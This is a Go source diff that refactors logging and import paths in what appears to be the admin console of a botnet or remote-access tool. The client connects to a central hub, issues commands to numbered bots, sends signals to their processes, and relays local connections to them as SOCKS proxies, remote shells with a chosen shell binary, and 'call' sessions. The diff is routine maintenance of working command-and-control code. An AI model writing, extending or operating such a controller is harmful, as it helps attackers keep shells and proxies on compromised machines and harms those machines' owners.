@@ -16,9 +16,10 @@ import (
 	"io/ioutil"
 	"encoding/base64"
 
-	"./lib/fakehttp"
-	kit "./lib/toolkit"
-	"./lib/base"
+	"lib/fakehttp"
+	kit "local/toolkit"
+	"local/base"
+	vlog "local/log"
 )
 
 
@@ -58,9 +59,9 @@ type loSrv struct {
 
 func main() {
 	flag.Parse()
-	verbosity = *verb
-	if verbosity > 3 {
-		std.SetFlags(log.LstdFlags | log.Lmicroseconds)
+	vlog.Verbosity = *verb
+	if vlog.Verbosity > 3 {
+		vlog.Std.SetFlags(log.LstdFlags | log.Lmicroseconds)
 	}
 
 	admin = base.NewAuth()
@@ -78,7 +79,7 @@ func main() {
 				var err error
 				caCert, err = ioutil.ReadFile(*crtFile)
 				if err != nil {
-					Vln(2, "Reading certificate error:", err)
+					vlog.Vln(2, "Reading certificate error:", err)
 					os.Exit(1)
 				}
 			}
@@ -97,13 +98,13 @@ func main() {
 		conn, err = net.Dial("tcp", *huburl)
 	}
 	if err != nil {
-		Vln(1, "connect err", err)
+		vlog.Vln(1, "connect err", err)
 		return
 	}
 
 	mux, err := admin.InitConn(conn)
 	if err != nil {
-		Vln(1, "connect err", err)
+		vlog.Vln(1, "connect err", err)
 		return
 	}
 
@@ -113,7 +114,7 @@ func main() {
 			_, err := mux.AcceptStream()
 			if err != nil {
 				mux.Close()
-				Vln(2, "connection to hub reset!!")
+				vlog.Vln(2, "connection to hub reset!!")
 				break
 			}
 		}
@@ -125,7 +126,7 @@ func main() {
 		fmt.Print(">")
 		text, err := reader.ReadString('\n')
 		if err != nil && err != io.EOF {
-			Vln(3, "[ReadLine]", err)
+			vlog.Vln(3, "[ReadLine]", err)
 			break
 		}
 		if err == io.EOF {
@@ -256,7 +257,7 @@ bot sig $bot_id $pid $signal_code`
 			out = "sync error!"
 			return
 		}
-		Vln(3, "Pull Info:", n, info)
+		vlog.Vln(3, "Pull Info:", n, info)
 
 	case "bg":
 		fallthrough
@@ -398,10 +399,10 @@ bot sig $bot_id $pid $signal_code`
 		kit.WriteVTagByte(p1, []byte(fp))
 		ret64, err := kit.ReadVLen(p1)
 		if err != nil || ret64 != int64(0) {
-			Vln(3, "[err]", args[0], ret64, err)
+			vlog.Vln(3, "[err]", args[0], ret64, err)
 			return
 		}
-		Vln(3, "[", args[0], "]", fp, id)
+		vlog.Vln(3, "[", args[0], "]", fp, id)
 
 	case "sig":
 		if len(args) < 4 {
@@ -510,7 +511,7 @@ func startLocal(srv *loSrv) {
 
 	lis, err := net.Listen("tcp", srv.Addr)
 	if err != nil {
-		Vln(2, "[local]Error listening:", err.Error())
+		vlog.Vln(2, "[local]Error listening:", err.Error())
 		return
 	}
 	defer lis.Close()
@@ -519,12 +520,12 @@ func startLocal(srv *loSrv) {
 
 	for {
 		if conn, err := lis.Accept(); err == nil {
-			Vln(2, "[local][new]", conn.RemoteAddr())
+			vlog.Vln(2, "[local][new]", conn.RemoteAddr())
 
 			// TODO: check client still online
 			go handleClient(srv.Admin, conn, srv.ID, srv.Args)
 		} else {
-			Vln(2, "[local]Accept err", err)
+			vlog.Vln(2, "[local]Accept err", err)
 			return
 		}
 	}
@@ -537,7 +538,7 @@ func handleClient(admin *base.Auth, p0 net.Conn, id string, argv []string) {
 	mode := argv[0]
 	switch mode {
 	case "socks":
-		//Vln(2, "socksv5")
+		//vlog.Vln(2, "socksv5")
 		p1, err := admin.GetConn2Client(id, base.B_fast0)
 		if err != nil {
 			return
@@ -555,9 +556,9 @@ func handleClient(admin *base.Auth, p0 net.Conn, id string, argv []string) {
 		}
 		defer p1.Close()
 
-		Vln(3, "[got]shellk", p0.RemoteAddr())
+		vlog.Vln(3, "[got]shellk", p0.RemoteAddr())
 		kit.Cp(p0, p1)
-		Vln(3, "[cls]shellk", p0.RemoteAddr())
+		vlog.Vln(3, "[cls]shellk", p0.RemoteAddr())
 
 	case "sh":
 		p1, err := admin.GetConn2Client(id, base.B_csh)
@@ -570,22 +571,22 @@ func handleClient(admin *base.Auth, p0 net.Conn, id string, argv []string) {
 		if len(argv) > 1 {
 			//shell = []byte(strings.Join(argv[1:], " "))
 			shell = []byte(argv[1])
-			Vln(4, "[sh]bin = ", string(shell))
+			vlog.Vln(4, "[sh]bin = ", string(shell))
 		}
 		kit.WriteVTagByte(p1, shell)
 
 		keep := int64(0)
 		if len(argv) > 2 {
 			if argv[2] != "0" {
-				Vln(4, "[sh]keep = ", true)
+				vlog.Vln(4, "[sh]keep = ", true)
 				keep = int64(1)
 			}
 		}
 		kit.WriteVLen(p1, keep)
 
-		Vln(3, "[got]sh", p0.RemoteAddr())
+		vlog.Vln(3, "[got]sh", p0.RemoteAddr())
 		kit.Cp(p0, p1)
-		Vln(3, "[cls]sh", p0.RemoteAddr())
+		vlog.Vln(3, "[cls]sh", p0.RemoteAddr())
 
 	case "call":
 		p1, err := admin.GetConn2Client(id, base.B_call)
@@ -601,13 +602,13 @@ func handleClient(admin *base.Auth, p0 net.Conn, id string, argv []string) {
 		kit.WriteVTagByte(p1, []byte(hashid))
 		ret64, err := kit.ReadVLen(p1)
 		if err != nil || ret64 != int64(0) {
-			Vln(3, "[err]call", ret64, hashid, p0.RemoteAddr(), err)
+			vlog.Vln(3, "[err]call", ret64, hashid, p0.RemoteAddr(), err)
 			return
 		}
 
-		Vln(3, "[got]call", hashid, p0.RemoteAddr())
+		vlog.Vln(3, "[got]call", hashid, p0.RemoteAddr())
 		kit.Cp(p0, p1)
-		Vln(3, "[cls]call", hashid, p0.RemoteAddr())
+		vlog.Vln(3, "[cls]call", hashid, p0.RemoteAddr())
 
 	default:
 	}
